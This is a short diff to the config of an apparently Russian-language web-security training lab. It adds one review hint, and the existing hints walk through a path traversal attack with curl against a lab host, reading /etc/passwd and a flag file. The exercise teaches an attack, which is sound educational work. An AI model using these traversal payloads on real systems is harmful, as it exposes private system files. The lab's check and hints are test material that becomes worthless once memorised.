@@ -20,6 +20,7 @@ lab:
   files: [task.md]
   check: "grep -q 'nto{' found.txt"
   hints:
+    - "Повторение (`web-architecture`): сначала `head -n 5 task.md` — вспомни приём из «Архитектура веб-приложений: клиент, сервер, БД, прокси»."
     - Обычный файл: `curl -s -i 'http://shop.lab.local/download?file=report.pdf'`.
     - Выход из каталога: `curl -s 'http://shop.lab.local/download?file=../../../../etc/passwd'`.
     - На уровень выше каталога приложения лежит `flag.txt`: `--data-urlencode 'file=../flag.txt'`.
